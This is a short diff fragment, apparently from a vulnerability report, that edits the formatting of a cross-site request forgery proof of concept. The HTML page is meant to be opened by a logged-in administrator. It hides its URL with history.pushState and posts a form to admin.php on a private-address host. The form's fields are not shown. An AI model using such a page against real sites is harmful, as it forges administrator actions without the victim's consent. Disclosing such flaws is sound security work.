@@ -1,6 +1,6 @@
 After the administrator logged in, open the following page
 
-`<html>
+<html>
   <body>
   <script>history.pushState('', '', '/')</script>
     <form action="http://10.33.62.73:8080/admin.php?" method="POST">
@@ -48,4 +48,4 @@ After the administrator logged in, open the following page
       <input type="submit" value="Submit request" />
     </form>
   </body>
-</html>`
+</html>
